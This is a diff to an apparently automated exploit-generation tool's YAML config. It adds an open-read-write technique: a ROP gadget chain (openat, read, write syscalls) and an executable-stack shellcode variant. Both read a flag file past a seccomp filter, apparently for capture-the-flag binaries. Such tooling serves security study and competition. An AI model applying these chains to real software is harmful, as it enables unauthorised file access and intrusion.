@@ -38,6 +38,42 @@ mcts:
 
 priors: [6, 14]
 
+build:
+  technique: orw
+  variants:
+    # the ROP path (nx on): the openat/read/write chain aims the
+    # binary's own .data anchors (flag_path, out_buf) through the
+    # pop/syscall gadget set the profiler already carries. AT_FDCWD
+    # (-100) rides as its unsigned qword; the filter's openat-only
+    # discipline is the chain's first syscall. fd 3: the lowest free
+    # descriptor once stdin/out/err are taken.
+    - name: rop
+      layout:
+        - [padding, measured_offset]
+        - [chain,
+           "gadget:pop_rax_ret", "const:257",
+           "gadget:pop_rdi_ret", "const:18446744073709551516",
+           "gadget:pop_rsi_ret", "sym:flag_path",
+           "gadget:pop_rdx_ret", "const:0",
+           "gadget:syscall_ret",
+           "gadget:pop_rax_ret", "const:0",
+           "gadget:pop_rdi_ret", "const:3",
+           "gadget:pop_rsi_ret", "sym:out_buf",
+           "gadget:pop_rdx_ret", "const:256",
+           "gadget:syscall_ret",
+           "gadget:pop_rax_ret", "const:1",
+           "gadget:pop_rdi_ret", "const:1",
+           "gadget:pop_rsi_ret", "sym:out_buf",
+           "gadget:pop_rdx_ret", "const:256",
+           "gadget:syscall_ret"]
+    # the stack path (nx off): the orw stub rides the executable
+    # stack, the input buffer's address rides the harvest leak
+    - name: stack
+      layout:
+        - [padding, measured_offset, sled]
+        - [qword, leak:input]
+        - [shellcode, orw, flag.txt]
+
 
 # The defender side (the corpus read backwards): what this technique
 # looks like to the defenses. Armored by check 9.
